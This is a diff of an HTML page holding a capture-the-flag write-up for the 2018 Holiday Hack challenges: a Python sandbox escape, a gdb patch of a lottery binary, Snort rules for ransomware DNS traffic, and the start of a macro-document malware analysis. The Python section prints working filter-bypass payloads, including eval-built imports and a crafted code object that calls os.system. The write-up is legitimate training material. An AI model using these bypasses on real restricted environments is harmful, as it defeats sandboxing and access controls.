-Use of the command os<span style=color:#719e07>.</span>system <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span></code></pre></div>
-<p><code>os.system</code> is also banned. We need to find another thing in the os module (or any other module) to execute stuff.</p>
+Use of the command os<span style=color:#719e07>.</span>system <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span>
+</code></pre></div><p><code>os.system</code> is also banned. We need to find another thing in the os module (or any other module) to execute stuff.</p>
 <p><code>subprocess</code> is also banned.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>&gt;&gt;&gt;</span> subprocess <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;subprocess&#34;)&#39;</span>) 
 <span style=color:#719e07>&gt;&gt;&gt;</span> subprocess<span style=color:#719e07>.</span>call([<span style=color:#2aa198>&#34;ls&#34;</span>])
-Use of the command subprocess<span style=color:#719e07>.</span> <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span></code></pre></div>
-<p>Same with <code>popen</code>, seems like they are filtering <code>open</code>.</p>
+Use of the command subprocess<span style=color:#719e07>.</span> <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span>
+</code></pre></div><p>Same with <code>popen</code>, seems like they are filtering <code>open</code>.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>&gt;&gt;&gt;</span> subprocess<span style=color:#719e07>.</span>popen
-Use of the command <span style=color:#b58900>open</span> <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span></code></pre></div>
-<p>I wonder if we need to use the <code>make_object</code> thing.</p>
+Use of the command <span style=color:#b58900>open</span> <span style=color:#719e07>is</span> prohibited <span style=color:#719e07>for</span> this question<span style=color:#719e07>.</span>
+</code></pre></div><p>I wonder if we need to use the <code>make_object</code> thing.</p>
 <p>We are running in <code>3.5.2</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>&gt;&gt;&gt;</span> sys <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;sys&#34;)&#39;</span>) 
 <span style=color:#719e07>&gt;&gt;&gt;</span> sys<span style=color:#719e07>.</span>version
-<span style=color:#2aa198>&#39;3.5.2 (default, Nov 12 2018, 13:43:14) </span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>[GCC 5.4.0 20160609]&#39;</span></code></pre></div>
-<p>And we get this</p>
+<span style=color:#2aa198>&#39;3.5.2 (default, Nov 12 2018, 13:43:14) </span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>[GCC 5.4.0 20160609]&#39;</span>
+</code></pre></div><p>And we get this</p>
 <p>Make sure it's the same version of Python or at least 3.5. Seems like 3.6 does not work.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>def</span> <span style=color:#268bd2>bypass</span>():
     <span style=color:#719e07>import</span> os
-    <span style=color:#b58900>print</span>(os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;./i_escaped&#34;</span>))</code></pre></div>
-<p>To get:</p>
+    <span style=color:#b58900>print</span>(os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;./i_escaped&#34;</span>))
+</code></pre></div><p>To get:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>def</span> <span style=color:#268bd2>a</span>():
    <span style=color:#719e07>return</span>
 
-a<span style=color:#719e07>.</span>__code__ <span style=color:#719e07>=</span> <span style=color:#b58900>type</span>(a<span style=color:#719e07>.</span>__code__)(<span style=color:#2aa198>0</span>,<span style=color:#2aa198>0</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>3</span>,<span style=color:#2aa198>67</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;d</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>l</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>}</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>t</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>|</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>j</span><span style=color:#cb4b16>\x02\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x02\x00\x83\x01\x00\x83\x01\x00\x01</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>S&#39;</span>,(<span style=color:#cb4b16>None</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>&#39;./i_escaped&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>, <span style=color:#2aa198>&#39;print&#39;</span>, <span style=color:#2aa198>&#39;system&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>,),<span style=color:#2aa198>&#39;&lt;stdin&gt;&#39;</span>,<span style=color:#2aa198>&#39;bypass&#39;</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x00\x01\x0c\x01</span><span style=color:#2aa198>&#39;</span>)</code></pre></div>
-<p>And it works:</p>
+a<span style=color:#719e07>.</span>__code__ <span style=color:#719e07>=</span> <span style=color:#b58900>type</span>(a<span style=color:#719e07>.</span>__code__)(<span style=color:#2aa198>0</span>,<span style=color:#2aa198>0</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>3</span>,<span style=color:#2aa198>67</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;d</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>l</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>}</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>t</span><span style=color:#cb4b16>\x01\x00</span><span style=color:#2aa198>|</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>j</span><span style=color:#cb4b16>\x02\x00</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x02\x00\x83\x01\x00\x83\x01\x00\x01</span><span style=color:#2aa198>d</span><span style=color:#cb4b16>\x00\x00</span><span style=color:#2aa198>S&#39;</span>,(<span style=color:#cb4b16>None</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>&#39;./i_escaped&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>, <span style=color:#2aa198>&#39;print&#39;</span>, <span style=color:#2aa198>&#39;system&#39;</span>),(<span style=color:#2aa198>&#39;os&#39;</span>,),<span style=color:#2aa198>&#39;&lt;stdin&gt;&#39;</span>,<span style=color:#2aa198>&#39;bypass&#39;</span>,<span style=color:#2aa198>1</span>,<span style=color:#2aa198>b</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x00\x01\x0c\x01</span><span style=color:#2aa198>&#39;</span>)
+</code></pre></div><p>And it works:</p>
 <pre tabindex=0><code>Loading, please wait......
  
   ____        _   _                      
  |  _ \ _   _| |_| |__   ___  _ __       
- | |_) | | | | __| &#39;_ \ / _ \| &#39;_ \      
+ | |_) | | | | __| '_ \ / _ \| '_ \      
  |  __/| |_| | |_| | | | (_) | | | |     
  |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
  | ____||___/___ __ _ _ __   ___  __| | |
- |  _| / __|/ __/ _` | &#39;_ \ / _ \/ _` | |
+ |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
  | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
  |_____|___/\___\__,_| .__/ \___|\__,_(_)
                      |_|                             
-That&#39;s some fancy Python hacking -
+That's some fancy Python hacking -
 You have sent that lizard packing!
 -SugarPlum Mary
             
 You escaped! Congratulations!
-0</code></pre>
-<p>Hint is:</p>
+0
+</code></pre><p>Hint is:</p>
 <pre tabindex=0><code>Yay, you did it! You escaped from the Python!
 
-As a token of my gratitude, I would like to share a rumor I had heard about Santa&#39;s new web-based packet analyzer - Packalyzer.
+As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.
 
 Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
 
@@ -1231,35 +1273,37 @@ There was suspicious-looking development code using environment variables to sto
 
 This elf then told me that manipulating values in the URL gave back weird and descriptive errors.
 
-I&#39;m hoping these errors can&#39;t be used to compromise SSL on the website and steal logins.
+I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
 
 On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!
 
-Oh my! Santa’s castle… it’s under siege!</code></pre>
-<hr>
-<h1 id=9-ransomware-recovery>9. Ransomware Recovery</h1>
-<p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.</p>
-<h2 id=the-sleighball>The Sleighball</h2>
-<p>Seems like it's an RE challenge because it talks about GDB and PEDA.</p>
+Oh my! Santa’s castle… it’s under siege!
+</code></pre><hr>
+<h1 id=9-ransomware-recovery>9. Ransomware Recovery
+<a class=header-link href=#9-ransomware-recovery><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.</p>
+<h2 id=the-sleighball>The Sleighball
+<a class=header-link href=#the-sleighball><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Seems like it's an RE challenge because it talks about GDB and PEDA.</p>
 <p>Complete this challenge by winning the sleighbell lottery for Shinny Upatree.</p>
 <pre tabindex=0><code>$ ls
 gdb  objdump  sleighbell-lotto
 elf@523afd1c9082:~$ file sleighbell-lotto 
 sleighbell-lotto: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically link
 ed, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4f713b9618
-45b98512a7d8df8692317317d5dfb8, not stripped</code></pre>
-<p><code>not stripped</code> means debug symbols? Probably. Woot.</p>
+45b98512a7d8df8692317317d5dfb8, not stripped
+</code></pre><p><code>not stripped</code> means debug symbols? Probably. Woot.</p>
 <p>Fortunately it's only 38K so it's a pretty small binary.</p>
 <p>Running it manually</p>
 <pre tabindex=0><code>$ ./sleighbell-lotto 
 
 The winning ticket is number 1225.
-Rolling the tumblers to see what number you&#39;ll draw...
+Rolling the tumblers to see what number you'll draw...
 
 You drew ticket number 4965!
 
-Sorry - better luck next year!</code></pre>
-<p>The winning number seems to be <code>1225</code> all the time.</p>
+Sorry - better luck next year!
+</code></pre><p>The winning number seems to be <code>1225</code> all the time.</p>
 <p><code>objdump -M intel -D sleighbell-lotto > dump1</code></p>
 <p><code>1225</code> is <code>04 C9</code> cannot find it in the objdump.</p>
 <p>Symbol table</p>
@@ -1357,8 +1401,8 @@ SYMBOL TABLE:
 0000000000000000       F *UND*  0000000000000000              memcpy@@GLIBC_2.14
 0000000000000000       F *UND*  0000000000000000              time@@GLIBC_2.2.5
 00000000000014ca g     F .text  00000000000000e1              main
-00000000000008c8 g     F .init  0000000000000000              _init</code></pre>
-<p><code>break main</code> and <code>set disassembly-flavor intel</code></p>
+00000000000008c8 g     F .init  0000000000000000              _init
+</code></pre><p><code>break main</code> and <code>set disassembly-flavor intel</code></p>
 <p>Then <code>disass</code> on main.</p>
 <pre tabindex=0><code>   0x00005555555554ca &lt;+0&gt;:     push   rbp
    0x00005555555554cb &lt;+1&gt;:     mov    rbp,rsp
@@ -1413,16 +1457,16 @@ SYMBOL TABLE:
    0x0000555555555597 &lt;+205&gt;:   mov    eax,0x0
    0x000055555555559c &lt;+210&gt;:   call   0x5555555554b7 &lt;sorry&gt;
    0x00005555555555a1 &lt;+215&gt;:   mov    edi,0x0
-   0x00005555555555a6 &lt;+220&gt;:   call   0x555555554920 &lt;exit@plt&gt;</code></pre>
-<p>Something is pushed to <code>rdi</code> and then <code>getenv</code> is called. We can break on the <code>call getenv</code> line and read the contents of <code>rdi</code>.</p>
+   0x00005555555555a6 &lt;+220&gt;:   call   0x555555554920 &lt;exit@plt&gt;
+</code></pre><p>Something is pushed to <code>rdi</code> and then <code>getenv</code> is called. We can break on the <code>call getenv</code> line and read the contents of <code>rdi</code>.</p>
 <pre tabindex=0><code>(gdb) x/s $rdi
-0x55555555abaf: &#34;RESOURCE_ID&#34;</code></pre>
-<p>So it's reading <code>RESOURCE_ID</code> from environmental variables and if it's not zero (see <code>test rax rax</code>) it jumps to <code>main+47</code></p>
+0x55555555abaf: &quot;RESOURCE_ID&quot;
+</code></pre><p>So it's reading <code>RESOURCE_ID</code> from environmental variables and if it's not zero (see <code>test rax rax</code>) it jumps to <code>main+47</code></p>
 <p><code>si</code> steps in and <code>ni</code> steps over for assembly instructions.</p>
 <p>Result is</p>
 <pre tabindex=0><code>(gdb) x/s $rax
-0x7fffffffe951: &#34;7a29a437-8523-4513-828e-53394fa647a4&#34;</code></pre>
-<p>Might be an environment thing because if it's zero, the program exits.</p>
+0x7fffffffe951: &quot;7a29a437-8523-4513-828e-53394fa647a4&quot;
+</code></pre><p>Might be an environment thing because if it's zero, the program exits.</p>
 <p>edi is set to zero and then <code>time</code> is called. Which gets the time.</p>
 <p><code>ni</code> to step over it. After the function call <code>rax</code> has the current time:</p>
 <p><code>rax 0x5c28c70b 1546176267</code></p>
@@ -1430,19 +1474,19 @@ SYMBOL TABLE:
 <p><code>srand(time)</code> calls srand and seeds it with current time.</p>
 <p>Before <code>puts</code> we can see <code>rdi</code> and see it always prints the following text.</p>
 <pre tabindex=0><code>(gdb) x/s $rdi
-0x55555555ad50: &#34;\nThe winning ticket is number 1225.\nRolling the tumblers to see what nu
-mber you&#39;ll draw...\n&#34;</code></pre>
-<p>So winning number is either always <code>1225</code> or it's just bogus.</p>
+0x55555555ad50: &quot;\nThe winning ticket is number 1225.\nRolling the tumblers to see what nu
+mber you'll draw...\n&quot;
+</code></pre><p>So winning number is either always <code>1225</code> or it's just bogus.</p>
 <p>Then it sleeps for a second (see <code>sleep</code>).</p>
 <p>Then calls <code>rand</code> and then does a bunch of stuff.</p>
 <p>Long story short, the result of calculation ends up in <code>eax</code> and stored in memory.</p>
-<pre tabindex=0><code>   0x000055555555554c &lt;+130&gt;:   mov    DWORD PTR [rbp-0x4],eax</code></pre>
-<p>Set a breakpoint here and change the value to <code>0x04C9</code></p>
+<pre tabindex=0><code>   0x000055555555554c &lt;+130&gt;:   mov    DWORD PTR [rbp-0x4],eax
+</code></pre><p>Set a breakpoint here and change the value to <code>0x04C9</code></p>
 <pre tabindex=0><code>break *0x000055555555554c
 c # continue
 set $rax = 0x4c9
-c # continue</code></pre>
-<p>And we're done.</p>
+c # continue
+</code></pre><p>And we're done.</p>
 <pre tabindex=0><code>(gdb) set $rax = 0x4c9
 (gdb) c
 Continuing.
@@ -1450,19 +1494,19 @@ You drew ticket number 1225!
                                                                                 
                                                      .....          ......      
                                      ..,;:::::cccodkkkkkkkkkxdc;.   .......     
-                             .&#39;;:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
-                         &#39;:okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
+                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
+                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                      .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                   .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
-                &#39;lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
-              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd&#39;                       
-            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&#39;                         
-           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&#39;                           
+                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
+              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
+            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
+           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
            xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
           :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
        ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
-     ...................,&#39;,,:lxkkkkkkkkkkkkkd.                                  
-     ..........................&#39;;;:coxkkkkk:                                    
+     ...................,',,:lxkkkkkkkkkkkkkd.                                  
+     ..........................';;:coxkkkkk:                                    
         ...............................ckd.                                     
           ...............................                                       
                 ...........................                                     
@@ -1470,11 +1514,11 @@ You drew ticket number 1225!
                               ....... ...                                       
 With gdb you fixed the race.
 The other elves we did out-pace.
-  And now they&#39;ll see.
-  They&#39;ll all watch me.
-I&#39;ll hang the bells on Santa&#39;s sleigh!
-Congratulations! You&#39;ve won, and have successfully completed this challenge.</code></pre>
-<p><strong>We could have also directly jumped to winnerwinner I guess, but this was more fun.</strong></p>
+  And now they'll see.
+  They'll all watch me.
+I'll hang the bells on Santa's sleigh!
+Congratulations! You've won, and have successfully completed this challenge.
+</code></pre><p><strong>We could have also directly jumped to winnerwinner I guess, but this was more fun.</strong></p>
 <p>Hint is</p>
 <pre tabindex=0><code>Sweet candy goodness - I win! Thank you so much!
 
@@ -1484,18 +1528,21 @@ Several elves reported receiving a cookie recipe Word doc. When opened, a PowerS
 
 Many elves were affected, so Alabaster went to go see if he could help out.
 
-I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.</code></pre><pre tabindex=0><code>Alabaster Snowball3:54AM
+I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.
+</code></pre><pre tabindex=0><code>Alabaster Snowball3:54AM
 Help, all of our computers have been encrypted by ransomware!
 
-I came here to help but got locked in &#39;cause I dropped my &#34;Alabaster Snowball&#34; badge in a rush.
+I came here to help but got locked in 'cause I dropped my &quot;Alabaster Snowball&quot; badge in a rush.
 
 I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted!
 
-Unfortunately, the password database I keep on my computer was encrypted, so now I don&#39;t have access to any of our systems.
+Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.
 
-If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!</code></pre>
-<h2 id=9-1-catch-the-malware>9.1 Catch the Malware</h2>
-<p>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.</p>
+If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!
+</code></pre>
+<h2 id=91-catch-the-malware>9.1 Catch the Malware
+<a class=header-link href=#91-catch-the-malware><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.</p>
 <p>So it seems the original malware was received in a word doc.</p>
 <pre tabindex=0><code>INTRO:
   Kringle Castle is currently under attacked by new piece of
@@ -1511,7 +1558,8 @@ COMPLETION:
   bad DNS traffic and NOT legitimate user traffic and the 
   system will notify you of your success.
   
-  Check out ~/more_info.txt for additional information.</code></pre><pre tabindex=0><code>elf@d7bf3c3316f3:~$ cat ~/more_info.txt 
+  Check out ~/more_info.txt for additional information.
+</code></pre><pre tabindex=0><code>elf@d7bf3c3316f3:~$ cat ~/more_info.txt 
 MORE INFO:
   A full capture of DNS traffic for the last 30 seconds is 
   constantly updated to:
@@ -1533,8 +1581,8 @@ HINT:
   IP addresses that change frequently within minutes or even 
   seconds to make detecting and block malware more difficult.
   As such, its a good idea to analyze traffic to find patterns
-  and match upon these patterns instead of just IP/domains</code></pre>
-<p>Looking at pcap files in the portal we can see some of the traffic that looks like malware traffic.</p>
+  and match upon these patterns instead of just IP/domains
+</code></pre><p>Looking at pcap files in the portal we can see some of the traffic that looks like malware traffic.</p>
 <pre tabindex=0><code>77616E6E61636F6F6B69652E6D696E2E707331.rahbegunsr.net
 
 77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com
@@ -1543,19 +1591,21 @@ HINT:
 
 16.77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com
 
-1.77616E6E61636F6F6B69652E6D696E2E707331.hngaerrbus.org</code></pre>
-<p>Seems like all of them have <code>77616E6E61636F6F6B69652E6D696E2E707331</code> in them.</p>
+1.77616E6E61636F6F6B69652E6D696E2E707331.hngaerrbus.org
+</code></pre><p>Seems like all of them have <code>77616E6E61636F6F6B69652E6D696E2E707331</code> in them.</p>
 <p>Now we need to see how we can make snort rules.</p>
 <p>outgoing and incoming</p>
-<pre tabindex=0><code>alert udp any any -&gt; any 53 (msg:&#34;malware DNS request&#34;; sid:10000001; content:&#34;77616E6E61636F6F6B69652E6D696E2E707331&#34;;)
-alert udp any 53 -&gt; any any (msg:&#34;malware DNS response&#34;;sid:10000002; content:&#34;77616E6E61636F6F6B69652E6D696E2E707331&#34;;)</code></pre>
-<p>If payload had binary in it, we had to put them in hex between pipes like <code>| 4D BA |</code>.</p>
+<pre tabindex=0><code>alert udp any any -&gt; any 53 (msg:&quot;malware DNS request&quot;; sid:10000001; content:&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;;)
+alert udp any 53 -&gt; any any (msg:&quot;malware DNS response&quot;;sid:10000002; content:&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;;)
+</code></pre><p>If payload had binary in it, we had to put them in hex between pipes like <code>| 4D BA |</code>.</p>
 <p>Woot</p>
 <pre tabindex=0><code>[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
-[+]  </code></pre>
-<h2 id=9-2-identify-the-domain>9.2 Identify the Domain</h2>
-<p>There's a zip file with a <code>docm</code> in it. Password is <code>elves</code>.</p>
-<p><a href=https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip rel=nofollow target=_blank>https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip</a></p>
+[+]  
+</code></pre>
+<h2 id=92-identify-the-domain>9.2 Identify the Domain
+<a class=header-link href=#92-identify-the-domain><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>There's a zip file with a <code>docm</code> in it. Password is <code>elves</code>.</p>
+<p><a href=https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip target=_blank rel="noreferrer noopener">https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip</a></p>
 <p>We have already seen the domain in Wireshark, it's <code>erohetfanu.com</code>.</p>
 <p>Nevertheless you can figure it out in a different ways.</p>
 <p><strong>This is a nice trick.</strong></p>
@@ -1563,12 +1613,12 @@ alert udp any 53 -&gt; any any (msg:&#34;malware DNS response&#34;;sid:10000002;
 <p>After downloading it, Windows defender goes haywire.</p>
 <pre tabindex=0><code>Trojan:Win32/Occamy.C
 
-file: C:\Users\IEUser\Desktop\9-2-malware-docm\CHOCOLATE_CHIP_COOKIE_RECIPE.docm-&gt;word/vbaProject.bin</code></pre>
-<p>We are not opening it, I do not even have Word on this VM so we will <code>Allow on Device</code>.</p>
+file: C:\Users\IEUser\Desktop\9-2-malware-docm\CHOCOLATE_CHIP_COOKIE_RECIPE.docm-&gt;word/vbaProject.bin
+</code></pre><p>We are not opening it, I do not even have Word on this VM so we will <code>Allow on Device</code>.</p>
 <p><code>docx</code> files are zip files, we can extract them with 7-zip.</p>
 <p>In <code>[Content_Types].xml</code> file we can see the <code>vba</code> file.</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;Override</span> PartName=<span style=color:#2aa198>&#34;/word/vbaData.xml&#34;</span> ContentType=<span style=color:#2aa198>&#34;application/vnd.ms-word.vbaData+xml&#34;</span><span style=color:#268bd2>/&gt;</span></code></pre></div>
-<p>Then we can open <code>/word/vbaData.xml</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;Override</span> PartName=<span style=color:#2aa198>&#34;/word/vbaData.xml&#34;</span> ContentType=<span style=color:#2aa198>&#34;application/vnd.ms-word.vbaData+xml&#34;</span><span style=color:#268bd2>/&gt;</span>
+</code></pre></div><p>Then we can open <code>/word/vbaData.xml</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#719e07>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
 <span style=color:#268bd2>&lt;wne:vbaSuppData</span>
 	xmlns:ve=<span style=color:#2aa198>&#34;http://schemas.openxmlformats.org/markup-compatibility/2006&#34;</span>
@@ -1583,8 +1633,8 @@ file: C:\Users\IEUser\Desktop\9-2-malware-docm\CHOCOLATE_CHIP_COOKIE_RECIPE.docm
 	<span style=color:#268bd2>&lt;wne:mcds&gt;</span>
 		<span style=color:#268bd2>&lt;wne:mcd</span> wne:macroName=<span style=color:#2aa198>&#34;PROJECT.NEWMACROS.AUTOOPEN&#34;</span> wne:name=<span style=color:#2aa198>&#34;Project.NewMacros.AutoOpen&#34;</span> wne:bEncrypt=<span style=color:#2aa198>&#34;00&#34;</span> wne:cmg=<span style=color:#2aa198>&#34;56&#34;</span><span style=color:#268bd2>/&gt;</span>
 	<span style=color:#268bd2>&lt;/wne:mcds&gt;</span>
-<span style=color:#268bd2>&lt;/wne:vbaSuppData&gt;</span></code></pre></div>
-<p><code>Autoopen</code> and stuff.</p>
+<span style=color:#268bd2>&lt;/wne:vbaSuppData&gt;</span>
+</code></pre></div><p><code>Autoopen</code> and stuff.</p>
 <p>Windows defender had deleted the actual payload, it's in <code>vbaProject.bin</code>.</p>
 <p>Now we can run <code>olevba</code> on it to get the macro. Seems like there are two macros with the same content.</p>
